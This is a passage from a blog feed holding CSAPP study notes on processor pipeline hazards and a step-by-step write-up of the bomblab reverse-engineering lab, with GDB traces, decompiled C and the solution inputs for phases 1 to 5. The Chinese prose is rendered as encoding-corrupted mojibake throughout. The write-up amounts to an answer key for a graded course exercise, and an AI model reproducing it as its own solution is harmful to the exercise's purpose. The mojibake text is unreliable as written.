class="headerlink" title="æµæ°´çº¿å†’é™©"></a>æµæ°´çº¿å†’é™©</h3><p>æˆ‘ä»¬éœ€è¦åœ¨æµæ°´çº¿ä¸­å¼•å…¥åé¦ˆç³»ç»Ÿï¼Œå› ä¸ºå½“ç›¸é‚»æŒ‡ä»¤æœ‰å…³è”çš„æ—¶å€™ï¼Œå‰ä¸€æ¡æŒ‡ä»¤å¹¶ä¸èƒ½å’Œåä¸€æ¡æŒ‡ä»¤å¹¶è¡Œæ‰§è¡Œã€‚è¿™ä¸ªå…³è”æœ‰ä¸¤ç§å½¢å¼</p><ul><li>æ•°æ®ç›¸å…³ï¼šåä¸€æ¡æŒ‡ä»¤éœ€è¦è¯»å–å‰ä¸€æ¡æŒ‡ä»¤æ‰§è¡Œçš„ç»“æœ</li><li>æ§åˆ¶ç›¸å…³ï¼šåä¸€æ¡æŒ‡ä»¤ä¸ºæ¡ä»¶è·³è½¬ï¼Œæ¡ä»¶å–å†³äºå½“å‰è¯­å¥çš„æ‰§è¡ŒçŠ¶æ€ã€‚</li></ul><p>è¿™äº›ç›¸å…³æœ‰å¯èƒ½ä¼šå¯¼è‡´æŒ‡ä»¤æ‰§è¡Œå¾—åˆ°é”™è¯¯çš„ç»“æœï¼Œç§°ä¸ºå†’é™©ã€‚</p><p>åŒç›¸å…³ä¸€æ ·ï¼Œå†’é™©ä¹Ÿå¯ä»¥è¢«åˆ†ä¸ºä¸¤éƒ¨åˆ†ï¼šæ•°æ®å†’é™©å’Œæ§åˆ¶å†’é™©ï¼Œæˆ‘ä»¬å…ˆè€ƒè™‘æ•°æ®å†’é™©ã€‚</p><h4 id="ç”¨æš‚åœæ¥é¿å…æ•°æ®å†’é™©"><a href="#ç”¨æš‚åœæ¥é¿å…æ•°æ®å†’é™©" class="headerlink" title="ç”¨æš‚åœæ¥é¿å…æ•°æ®å†’é™©"></a>ç”¨æš‚åœæ¥é¿å…æ•°æ®å†’é™©</h4><p>æš‚åœ (stalling) æ˜¯é¿å…å†’é™©çš„ä¸€ç§å¸¸ç”¨æŠ€æœ¯ï¼Œæš‚åœæ—¶ï¼Œå¤„ç†å™¨ä¼šåœæ­¢æµæ°´çº¿ä¸­ä¸€æ¡æˆ–å¤šæ¡æŒ‡ä»¤ï¼Œç›´åˆ°å†’é™©æ¡ä»¶ä¸å†æ»¡è¶³ã€‚è®©ä¸€æ¡æŒ‡ä»¤åœé¡¿åœ¨è¯‘ç é˜¶æ®µï¼Œç›´åˆ°äº§ç”Ÿå®ƒçš„æºæ“ä½œæ•°çš„æŒ‡ä»¤é€šè¿‡äº†å†™å›é˜¶æ®µï¼Œè¿™æ ·æˆ‘ä»¬çš„å¤„ç†å™¨å°±èƒ½é¿å…æ•°æ®å†’é™©ã€‚</p><h4 id="ç”¨è½¬å‘æ¥é¿å…æ•°æ®å†’é™©"><a href="#ç”¨è½¬å‘æ¥é¿å…æ•°æ®å†’é™©" class="headerlink" title="ç”¨è½¬å‘æ¥é¿å…æ•°æ®å†’é™©"></a>ç”¨è½¬å‘æ¥é¿å…æ•°æ®å†’é™©</h4><p>PIPE- çš„è®¾è®¡æ˜¯åœ¨è¯‘ç é˜¶æ®µä»å¯„å­˜å™¨æ–‡ä»¶ä¸­è¯»äººæºæ“ä½œæ•°ï¼Œä½†æ˜¯å¯¹è¿™äº›æºå¯„å­˜å™¨çš„å†™æœ‰å¯èƒ½è¦åœ¨å†™å›é˜¶æ®µæ‰èƒ½è¿›è¡Œã€‚ä¸å…¶æš‚åœç›´åˆ°å†™å®Œæˆï¼Œä¸å¦‚ç®€å•åœ°å°†è¦å†™çš„å€¼ä¼ åˆ°æµæ°´çº¿å¯„å­˜å™¨ E ä½œä¸ºæºæ“ä½œæ•°ã€‚</p><p>è¿™ç§å°†ç»“æœå€¼ç›´æ¥ä»ä¸€ä¸ªæµæ°´çº¿é˜¶æ®µä¼ åˆ°è¾ƒæ—©é˜¶æ®µçš„æŠ€æœ¯ç§°ä¸ºæ•°æ®è½¬å‘(data forwardingï¼Œæˆ–ç®€ç§°è½¬å‘ï¼Œæœ‰æ—¶ç§°ä¸ºæ—è·¯ bypassing)ã€‚æ•°æ®è½¬å‘éœ€è¦åœ¨åŸºæœ¬çš„ç¡¬ä»¶ç»“æ„ä¸­å¢åŠ ä¸€äº›é¢å¤–çš„æ•°æ®è¿æ¥å’Œæ§åˆ¶é€»è¾‘ã€‚</p><h4 id="åŠ è½½-x2F-ä½¿ç”¨æ•°æ®å†’é™©"><a href="#åŠ è½½-x2F-ä½¿ç”¨æ•°æ®å†’é™©" class="headerlink" title="åŠ è½½&#x2F;ä½¿ç”¨æ•°æ®å†’é™©"></a>åŠ è½½&#x2F;ä½¿ç”¨æ•°æ®å†’é™©</h4><p>æœ‰ä¸€ç±»æ•°æ®å†’é™©ä¸èƒ½å•çº¯ç”¨è½¬å‘æ¥è§£å†³ï¼Œå› ä¸ºå†…å­˜è¯»åœ¨æµæ°´çº¿å‘ç”Ÿçš„æ¯”è¾ƒæ™šã€‚</p><p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨æš‚åœ+è½¬å‘ä¸¤ç§æ€æƒ³ç»“åˆçš„æ–¹å¼è§£å†³å†’é™©ï¼Œå¦‚æœå‘ç°è®¿å­˜å¾—åˆ°çš„ç»“æœéœ€è¦åœ¨ä¸‹ä¸€æ¡æŒ‡ä»¤é©¬ä¸Šè¢«è®¿é—®ï¼Œé‚£ä¹ˆæˆ‘å°±æš‚åœä¸€ä¸ªæŒ‡ä»¤å‘¨æœŸç­‰åˆ°è®¿å­˜ç»“æŸä¹‹åé©¬ä¸Šè½¬å‘ç»™ä¸‹ä¸€æ¡æŒ‡ä»¤ï¼Œæ­¤æ—¶ä¸‹ä¸€æ¡æŒ‡ä»¤æ­£åœ¨è¯‘ç é˜¶æ®µã€‚è¿™ç§æ–¹æ³•å«åšåŠ è½½äº’é”ã€‚</p><h4 id="é¿å…æ§åˆ¶å†’é™©"><a href="#é¿å…æ§åˆ¶å†’é™©" class="headerlink" title="é¿å…æ§åˆ¶å†’é™©"></a>é¿å…æ§åˆ¶å†’é™©</h4><p>å½“å¤„ç†å™¨æ— æ³•æ ¹æ®å¤„äºå–æŒ‡é˜¶æ®µçš„å½“å‰æŒ‡ä»¤æ¥ç¡®å®šä¸‹ä¸€æ¡æŒ‡ä»¤çš„åœ°å€æ—¶ï¼Œå°±ä¼šå‡ºç°æ§åˆ¶å†’é™©ã€‚æˆ‘ä»¬çš„æµæ°´çº¿åŒ–å¤„ç†å™¨ä¸­ï¼Œæ§åˆ¶å†’é™©åªä¼šå‘ç”Ÿåœ¨ret æŒ‡ä»¤å’Œè·³è½¬æŒ‡ä»¤ã€‚</p><p>åœ¨å‡ºç°ç‰¹æ®Šæƒ…å†µæ—¶ï¼Œæš‚åœå’Œå¾€æµæ°´çº¿ä¸­æ’äººæ°”æ³¡çš„æŠ€æœ¯å¯ä»¥åŠ¨æ€è°ƒæ•´æµæ°´çº¿çš„æµç¨‹ã€‚</p><hr><p>åŸæ¥å·²ç» 20 å¤šå¤©äº†éƒ½æ²¡çœ‹å®Œè¿™ä¸€ç« ï¼Œçœ‹çš„å¤´æ˜è„‘èƒ€ğŸ˜¶â€ğŸŒ«ï¸</p><p>å…ˆè¿™æ ·ï¼ŒçœŸçš„çœ‹ä¸åŠ¨äº†ï¼Œå¤§æ¦‚æ‰«äº†ä¸€ä¸‹æ¥ä¸‹æ¥çš„å‡ ä¸ªå°èŠ‚å†…å®¹å’Œä¹‹å‰å¤§å·®ä¸å·®ä¸”çœ‹ä¸æ‡‚</p><p>æœ€è¿‘ <del>sxx</del> å¸ƒç½®çš„ä½œä¸šå¥½å¤šæ„Ÿè§‰é˜³æ°”éƒ½è¢«å¥¹å¸å¹²äº†ï¼Œæˆ‘æ˜¯æ‡’æƒ°è™«ğŸ˜¿</p>]]></content>
    
    
    <categories>
      
      <category>è¯»ä¹¦ç¬”è®°</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
      <tag>CSAPP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CSAPP ç¬¬ä¸‰ç«  bomblab attacklab</title>
    <link href="/2023/10/03/CSAPP-%E7%AC%AC%E4%B8%89%E7%AB%A0-bomblab/"/>
    <url>/2023/10/03/CSAPP-%E7%AC%AC%E4%B8%89%E7%AB%A0-bomblab/</url>
    
    <content type="html"><![CDATA[<p>åœ¨â€æ‹†å¼¹â€œè¿‡ç¨‹ä¸­ç»“åˆ GDB è°ƒè¯•ï¼Œåˆ†æç†è§£æŒæ¡å„ç§æŒ‡ä»¤å’Œæ•°æ®ç»“æ„çš„æ±‡ç¼–ä»£ç è¡¨ç¤º</p><span id="more"></span><h1 id="bomblab"><a href="#bomblab" class="headerlink" title="bomblab"></a>bomblab</h1><p>å®éªŒç»™åˆ°ä¸€ä¸ªå¯æ‰§è¡Œç¨‹åºå’Œä¸€ä¸ªCè¯­è¨€çš„æºç ï¼Œä½†æ˜¯æºç çš„å‡½æ•°æ²¡æœ‰ç»™å…¨ï¼Œåªèƒ½åˆ¤æ–­å¤§è‡´é€»è¾‘ã€‚</p><p>è®¾ç½®äº†å…­ä¸ªå…³å¡éœ€è¦å…¨éƒ¨é€šè¿‡ä¹‹åæ‰ç®—æˆåŠŸï¼Œåªè¦æœ‰ä¸€ä¸ªå…³å¡å¤±è´¥å°±ä¼šé€€å‡º</p><hr><p>å…ˆçœ‹äº†ä¸€çœ¼.cæ–‡ä»¶çš„æºç ï¼Œæ–‡ä»¶ä¸­æœ‰å¤§è‡´å¦‚ä¸‹å‡ ä¸ªå‡½æ•° ï¼š<code>initialize_bomb()</code> ã€<code>read_line()</code> ã€<code>explode bomb()</code>ã€ <code>phase_[number]()</code> ã€<code>phase_defuse</code>ã€‚</p><p>å…¶ä¸­ explode ç”¨æ¥å¼•çˆ†ç‚¸å¼¹ç»“æŸè¿›ç¨‹ï¼Œdefuse æ‹†å¼¹<del>ï¼ˆè¿™ä¸¤ä¸ªè¿˜æœ‰é‚£ä¸ªåˆå§‹åŒ–ç‚¸å¼¹éƒ½ä¸å¤ªé‡è¦ï¼‰</del>ï¼Œphase ç³»åˆ—å‡½æ•°å°±æ˜¯å…·ä½“æ¯ä¸€ä¸ªå…³å¡å¯¹åº”çš„å‡½æ•°ï¼Œæ¯æ¬¡æ–°å…³å¡éƒ½æ˜¯ <code>read_line()</code> å…ˆæ¥å—ç”¨æˆ·è¾“å…¥å†è¿›è¡Œåˆ¤æ–­çš„ã€‚</p><blockquote><p>ä¹‹å‰æœºå™¨é‡Œè£…äº† pwndbg ç”¨æ¥è°ƒè¯•ï¼Œæˆ‘è§‰å¾—æ¯”å…‰ç§ƒç§ƒçš„ gdb æ›´å¥½ç”¨ğŸ¤ªæ‰€ä»¥æˆ‘è¿™æ¬¡è¿˜æ˜¯ç”¨å®ƒå•¦</p></blockquote><p>ç›´æ¥ <code>gdb bomb</code> è°ƒè¯•çœ‹çœ‹ï¼Œå‘½ä»¤ <code>b main</code> åœ¨ main ä¸‹æ–­ç‚¹ç„¶å <code>n</code> æ­¥å…¥åˆ°ç¬¬ä¸€ä¸ªå…³å¡å‡½æ•°ã€‚</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%89%E7%AB%A0-bomblab/3-bomblab-read_line.png"></p><p>ç¨‹åºåœ¨ <code>read line()</code> è¿™é‡Œåœæ­¢ï¼Œæ¥æ”¶ç”¨æˆ·è¾“å…¥ã€‚ç”±äºå…³å¡åœ¨è¾“å…¥ä¹‹åï¼Œæ‰€ä»¥å…ˆè¾“å…¥ä¸€äº›ä¹±ç è·³è¿‡è¿™ä¸ªå‡½æ•°è¿›å…¥ä¸‹é¢çš„ <code>phase_1</code> ã€‚</p><h3 id="phase-1"><a href="#phase-1" class="headerlink" title="phase_1"></a>phase_1</h3><p>ä½¿ç”¨ <code>s</code> å‘½ä»¤è¿›å…¥åˆ°å‡½æ•°å†…éƒ¨ï¼Œå‘ç° <code>call  strings_not_equal</code> æŒ‡ä»¤ï¼Œæ ¹æ®å­—é¢æ„æ€ä¹Ÿå¯ä»¥çŸ¥é“è¿™æ˜¯æ¯”è¾ƒä¸¤ä¸ªå­—ç¬¦ä¸²ã€‚</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%89%E7%AB%A0-bomblab/3-bomblab-strings_not_equal.png"></p><p>æ­¤æ—¶ <em>rdi</em> å­˜å‚¨æˆ‘ä»¬åˆšåˆšè¾“å…¥çš„å†…å®¹ï¼Œ<em>rsi</em> å­˜å‚¨ç¨‹åºå°†è¦è¿›è¡Œæ¯”è¾ƒåˆ¤æ–­çš„å†…å®¹ï¼Œä¹Ÿæ˜¯æˆ‘ä»¬åº”è¯¥è¾“å…¥çš„æ­£ç¡®ç­”æ¡ˆï¼š</p><p> <strong>Border relations with Canada have never been better.</strong>  </p><p>æˆ‘ä»¬è¿™æ¡å‘½ä»¤æ‰§è¡Œå®Œæ¯•åå‘ç°è¿”å›å€¼æ˜¯ 0x1 ä¹Ÿå°±æ˜¯ 1ï¼Œåé¢æœ‰ä¸€ä¸ª <code>test eax,eax</code> æŒ‡ä»¤è·Ÿéšé›¶è·³è½¬ï¼Œä¹Ÿå°±æ˜¯è¯´åªæœ‰æ¯”è¾ƒ<strong>ä¸¤ä¸ªå­—ç¬¦ä¸²ç›¸ç­‰</strong>æ‰ä¼šç»§ç»­æ‰§è¡Œç¨‹åºï¼Œå¦‚æœè¿”å›å€¼ä¸º 1å°±ä¼šè°ƒç”¨ <code>explode_bomb</code> å‡½æ•°ç»“æŸç¨‹åºã€‚</p><h3 id="phase-2"><a href="#phase-2" class="headerlink" title="phase_2"></a>phase_2</h3><p>è¿›å…¥ä¸‹ä¸€ä¸ªå…³å¡ï¼Œè¿˜æ˜¯åŒæ ·å…ˆè¾“å…¥å†åˆ¤æ–­ã€‚å…ˆå¡«å……ä¸€äº›å­—ç¬¦ä¸²è¿›å»å†è¿›å…¥å‡½æ•°ä¸­è°ƒè¯•è§‚å¯Ÿã€‚</p><p>è¿›å…¥ phase_2 åçœ‹åˆ°ä¸€ä¸ª read_six_number å‡½æ•°ï¼Œé¡¾åæ€ä¹‰å°±æ˜¯è¯»å–å…­ä¸ªæ•°å­—ã€‚</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%89%E7%AB%A0-bomblab/3-bomblab-read_six_number.png"></p><p>è¿™é‡Œå‘ç°è¯»å–çš„æ•°å­—æ˜¯ä»æˆ‘ä»¬å¼€å§‹ <code>read_line()</code> ä¸­è¾“å…¥çš„å­—ç¬¦ä¸²æˆªå–çš„ï¼Œ  ä¹‹å <code>cmp  dword ptr [rsp], 1</code> æŒ‡ä»¤ä¼šå°†æ ˆæŒ‡é’ˆ rsp çš„å€¼å’Œ 1 æ¯”è¾ƒã€‚å…¶ä¸­ dword ptr ä»£è¡¨è¦æ¯”è¾ƒçš„æ•°æ®åœ¨å†…å­˜ä¸­å æ®4ä¸ªå­—èŠ‚ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬<strong>è¾“å…¥çš„ç¬¬ä¸€ä¸ªæ•°å­—è¦æ˜¯ 1</strong> ã€‚</p><p>è¿™æ ·ä¹‹åå°±ä¼šè·³è½¬åˆ° <code>phase_2+52</code> çš„åœ°æ–¹å»ï¼Œæˆ‘ä»¬å‘ç°å®ƒæ˜¯ä¸€ä¸ªå¾ªç¯</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%89%E7%AB%A0-bomblab/3-bomblab-six_number_je.png"></p><p>å…¶ä¸­å¾ªç¯ä¸­çš„åˆ¤æ–­å†…å®¹æ˜¯å–å½“å‰ rbx-4 çš„å€¼ä¹Ÿå°±æ˜¯åˆ¤æ–­çš„ä¸Šä¸€ä¸ªæ•°å­—çš„å€¼èµ‹å€¼ç»™ eaxï¼Œ æ‰§è¡Œ <code>add eax, eax</code> å°†å€¼ä¹˜ 2 å†ä¸å½“å‰è¦åˆ¤æ–­çš„æ•°å­—æ¯”è¾ƒã€‚</p><p>æ€»çš„æ¥çœ‹æ˜¯ç¬¬ä¸€ä¸ªæ•°å­—æ˜¯ 1 ï¼Œä¹‹åçš„æ¯ä¸€ä¸ªæ•°å­—éƒ½æ˜¯å‰é¢çš„æ•°å­—ä¹˜ 2 ã€‚æ‰€ä»¥åœ¨è¿™ä¸ªå…³å¡åº”è¯¥è¾“å…¥ <strong>1 2 4 8 16 32</strong> ã€‚</p><h3 id="phase-3"><a href="#phase-3" class="headerlink" title="phase_3"></a>phase_3</h3><p>è¿›å…¥åˆ°å‡½æ•°ä¸­å‘ç°æœ‰ä¸€ä¸ª <code>scanf()</code> å‡½æ•°è¾“å‡ºçš„æ ¼å¼åŒ–å­—ç¬¦ä¸²æ˜¯ä¸¤ä¸ª <code>%d</code>ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬åœ¨ç¬¬ä¸‰å…³è¦è¾“å…¥ä¸¤ä¸ªæ•´æ•°</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%89%E7%AB%A0-bomblab/3-bomblab-scanf.png"></p><p>å…¶ä¸­è¿”å›å€¼ <code>eax</code> è¡¨ç¤ºæ­£ç¡®æ ¼å¼åŒ–çš„æ•°æ®ä¸ªæ•°ï¼Œè¿™é‡Œçš„åˆ¤æ–­è¦æ±‚è¿”å›å€¼è¦å¤§äº 1 ã€‚</p><p>éšåæˆ‘ä»¬è¿›å…¥åˆ° <code>phase_3+39</code> ï¼Œè¿™é‡Œè¿›çš„æ“ä½œ <code>cmp   dword ptr [rsp+8], 7; ja    phase_3+106</code> ï¼Œç›®æ ‡æ“ä½œæ•°å¤§äº 7 æ‰ä¼šè¿›è¡Œè·³è½¬ï¼Œè·³è½¬è¿‡å»å‘ç°æ˜¯ <code>explode_bomb()</code> ğŸ˜…ã€‚</p><p>æˆ‘ä»¬è°ƒè¯•çœ‹è¿™ä¸ª <code>[rsp+8]</code> å­˜å‚¨çš„ä¿¡æ¯å°±æ˜¯æˆ‘ä»¬è¾“å…¥çš„ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬<strong>è¾“å…¥çš„ç¬¬ä¸€ä¸ªæ•°è¦æ˜¯æ•´æ•°ä¸”è¦å°äºç­‰äº 7</strong>ã€‚</p><p>ä¸‹é¢å°±è¿›å…¥äº†ä¸€ä¸ªè·³è½¬è¡¨</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%89%E7%AB%A0-bomblab/3-bomblab-struct.png"></p><p>æˆ‘ä»¬æŸ¥çœ‹è·³è½¬è¡¨å‚¨å­˜çš„ä¿¡æ¯</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%89%E7%AB%A0-bomblab/3-bomblab-struct_array.png"></p><p>è¿™é‡Œä¹Ÿå¯ä»¥çœ‹å‡ºæ¥è¾“å…¥çš„ç¬¬ä¸€ä¸ªå€¼ä¸èƒ½å¤§äº7 çš„åŸå› ï¼Œå®ƒè¿˜è¦ç”¨æ¥åŒ¹é…è·³è½¬è¡¨å¯¹åº”ä»0å¼€å§‹åˆ°7çš„ç´¢å¼•å€¼ã€‚</p><p>ç¬¬ä¸€ä¸ª <code>0x400f7c</code> å°±æ˜¯ <code>phase_3+57</code> çš„åœ°å€ï¼Œæˆ‘å°±ç›´æ¥ç”¨å®ƒï¼Œå¯¹åº”æˆ‘ä»¬è¾“å…¥çš„ç¬¬ä¸€ä¸ªæ•°å­—æ˜¯ 0ã€‚</p><p>è¿™é‡Œçš„æŒ‡ä»¤å¯¹åº”å°† 0xcf ä¹Ÿå°±æ˜¯ 207 èµ‹å€¼ç»™ eaxï¼Œéšåå°†æˆ‘ä»¬è¾“å…¥çš„ç¬¬äºŒä¸ªæ•°å­—å’Œ eax æ¯”è¾ƒï¼Œåªæœ‰ç›¸ç­‰æ‰èƒ½é¿å¼€ <code>explode_bomb()</code></p><blockquote><p>çœ‹äº†çœ‹å…¶ä»–çš„é€‰é¡¹éƒ½æ˜¯ç»™ eax èµ‹å€¼å†æ¯”è¾ƒï¼ŒåŸç†æ˜¯ä¸€æ ·çš„</p></blockquote><p>æ‰€ä»¥è¯´ï¼Œç»¼ä¸Šæˆ‘ä»¬çŸ¥é“ç¬¬ä¸‰æ¬¡è¾“å…¥åº”è¯¥è¾“å…¥ä¸¤ä¸ªæ•´æ•°ï¼Œæˆ‘è¾“å…¥çš„æ˜¯ <strong>0 207</strong></p><h3 id="phase-4"><a href="#phase-4" class="headerlink" title="phase_4"></a>phase_4</h3><p>4å’Œ3æ˜¯ä¸€æ ·çš„å¥—è·¯ï¼Œè¦æ±‚è¾“å…¥ä¸¤ä¸ªæ•´æ•°</p><p>ä¸è¿‡è¿™æ¬¡çš„ç¬¬ä¸€ä¸ªæ•°è¦æ±‚å°äºç­‰äº 0xe ä¹Ÿå°±æ˜¯ 14 æ‰èƒ½è·³è½¬</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%89%E7%AB%A0-bomblab/3-bomblab-jbe_0xe.png"></p><p>éšåæˆ‘ä»¬è¿›å…¥ func4 ï¼Œåœ¨æ­¤ä¹‹å‰å¯ä»¥å‘ç°å…¶ä¸­çš„å››ä¸ªå‚æ•°åˆ†åˆ«ç”±å‰é¢çš„æŒ‡ä»¤èµ‹å€¼ï¼šedx &#x3D; 0xe&#x3D;14 ã€ esi &#x3D; 0 ã€ edi &#x3D; æˆ‘ä»¬è¾“å…¥çš„ç¬¬ä¸€ä¸ªæ•°å­—</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%89%E7%AB%A0-bomblab/3-bomblab-mov.png"></p><p>è¿›å…¥ func4  ,å¤ªé•¿äº†ç›´æ¥ <code>disass func4 </code> çœ‹è¿™ä¸ªå‡½æ•°å®Œæ•´çš„æ±‡ç¼–ä»£ç </p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%89%E7%AB%A0-bomblab/3-bomblab-fun4.png"></p><p>å¾ˆæ˜æ˜¾å°±å‘ç°å‘ç°å®ƒ call äº†å¾ˆå¤šæ¬¡ func4 ä¹Ÿå°±æ˜¯è¯´è¿™ä¸ªæ˜¯ä¸ªé€’å½’å‡½æ•°ï¼Œäººå·¥åç¼–è¯‘ä¸€ä¸‹å¤§æ¦‚å°±æ˜¯ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">func4</span><span class="hljs-params">(x,y,z)</span>      <span class="hljs-comment">//ç¬¬ä¸€æ¬¡é€’å½’ä¸­ï¼Œx=æˆ‘ä»¬è¾“å…¥çš„ç¬¬ä¸€ä¸ªæ•°ï¼Œy=0,z=14</span><br>&#123;    <br>    <span class="hljs-type">int</span> arg=z;<br>    arg-=y;<br>    <span class="hljs-type">int</span> val=arg;<br>    val&gt;&gt;=<span class="hljs-number">31</span>;<br>    arg+=val;<br>    arg&gt;&gt;=<span class="hljs-number">1</span>;<br>    val=arg+y;<br>    <span class="hljs-keyword">if</span>(val&gt;x)<br>    &#123;<br>        z=val<span class="hljs-number">-1</span>;<br>        func4(x,y,z);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        arg=<span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span>(val&lt;x)<br>        &#123;<br>            y+=<span class="hljs-number">1</span>;<br>            func4(x,y,z);<br>            arg=arg+arg+<span class="hljs-number">1</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> arg;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ•´ç†ç®€åŒ–ä¸€ä¸‹ï¼Œè®©å®ƒé•¿å¾—æ›´åƒæˆ‘ä»¬å¹³æ—¶æ¥è§¦åˆ°çš„é€’å½’ï¼Œå¤§æ¦‚å°±æ˜¯ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">int</span> <span class="hljs-title function_">func4</span><span class="hljs-params">(<span class="hljs-type">int</span> x,<span class="hljs-type">int</span> y,<span class="hljs-type">int</span> z)</span><br>&#123;<br>    <span class="hljs-type">int</span> arg=z-y;<br>    <span class="hljs-type">int</span> val=arg&gt;&gt;<span class="hljs-number">31</span>;<br>    arg+=val;<br>    arg&gt;&gt;=<span class="hljs-number">1</span>;<br>    val=arg+y;<br>    <span class="hljs-keyword">if</span>(val&gt;x)<br>    &#123;<br>        arg=func4(x,y,val<span class="hljs-number">-1</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        arg=<span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span>(val&lt;x)<br>        &#123;<br>            arg=func4(x,y+<span class="hljs-number">1</span>,z);<br>            arg=arg*<span class="hljs-number">2</span>+<span class="hljs-number">1</span>;<br>        &#125;<br>    &#125;<br><span class="hljs-keyword">return</span> arg;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ ¹æ®å‡½æ•°å¤– <code>phase_4+65</code> å¤„çš„åˆ¤æ–­ï¼Œå¦‚æœå‡½æ•°è¿”å›å€¼ä¸ºé 0 å°±ä¼šå¼•çˆ†ç‚¸å¼¹ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬è¦è®©è¿™ä¸ªé€’å½’å‡½æ•°çš„æœ€ç»ˆè¿”å›å€¼ä¸º0ã€‚å†™ä¸ªæµ‹è¯•ä»£ç è¿è¡Œä¸€ä¸‹å‘ç° 0ã€1ã€3 ã€7 éƒ½å¯ä»¥ã€‚</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%89%E7%AB%A0-bomblab/3-bomblab-phase4_return.png"></p><p>åœ¨è¿”å›å€¼çš„æ£€éªŒåè¿˜æœ‰ä¸€ä¸ªå¯¹ <code>rsp+0xc</code> çš„æ£€éªŒï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬è¾“å…¥çš„ç¬¬äºŒä¸ªå€¼ä¹Ÿè¦ä¸º0ã€‚</p><p>æ‰€ä»¥ç¬¬å››å¤„åº”è¯¥è¾“å…¥ä¸¤ä¸ªæ•°å­—ï¼Œ<strong>ç¬¬ä¸€ä¸ªæ˜¯ 0ã€1ã€3ã€7 ä»»é€‰å…¶ä¸€ï¼Œç¬¬äºŒä¸ªæ˜¯0</strong>ã€‚</p><h3 id="phase-5"><a href="#phase-5" class="headerlink" title="phase_5"></a>phase_5</h3><p>è¿˜æ˜¯è¾“å…¥ aaaaaaaaa è¿›å…¥åˆ°ç¬¬äº”ä¸ªå…³å¡ï¼Œæœ‰ä¸€ä¸ª <code>string_lenth()</code> å‡½æ•°</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%89%E7%AB%A0-bomblab/3-bomblab-stringlenth.png"></p><p>å‡½æ•°ä¸‹æ–¹ç´§è·Ÿçš„æŒ‡ä»¤ <code>cmp eax, 6</code> åˆ¤æ–­å‡½æ•°çš„è¿”å›å€¼å¿…é¡»æ˜¯ 6ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬è¦è¾“å…¥å…­ä¸ªå­—ç¬¦</p><p>å¾€ä¸‹çœ‹æˆåŠŸè·³è½¬åçš„ä»£ç ï¼Œé‡Œé¢è¿˜è®¾ç½®äº†ä¸€ä¸ª canary ä¿æŠ¤ï¼Œåº”è¯¥æ˜¯æ£€éªŒä¸Šé¢çš„ 6 é•¿åº¦å­—ç¬¦çš„ã€‚ä»£ç ä¾æ—§æ˜¯å¾ˆé•¿æˆ‘ä»¬ç›´æ¥çœ‹æ±‡ç¼–ä»£ç </p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B8%89%E7%AB%A0-bomblab/3-bomblab-phase_5.png"></p><blockquote><p>ç®­å¤´æ‰€æŒ‡å°±æ˜¯æˆ‘ä»¬å®Œæˆè¾“å…¥é•¿åº¦åˆ¤æ–­è·³è½¬åï¼Œå…³å¡è®¾ç½®ä»£ç å¼€å§‹çš„åœ°æ–¹</p></blockquote><p>å…ˆçœ‹ explode_bomb å‰é¢ç”¨æ¥åˆ¤æ–­çš„æŒ‡ä»¤ï¼Œæœ‰ä¸€ä¸ªå’Œ phase_1 ä¸€æ ·çš„ <code>string_not_equal()</code> å‡½æ•°ï¼Œæ¯”è¾ƒçš„æ–‡æœ¬æ˜¯ flyersã€‚ä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬è¾“å…¥çš„è¿™ä¸ªå­—ç¬¦ä¸²æœ€åçš„ç»“æœè¦æ˜¯ â€œ<strong>flyers</strong>â€œ 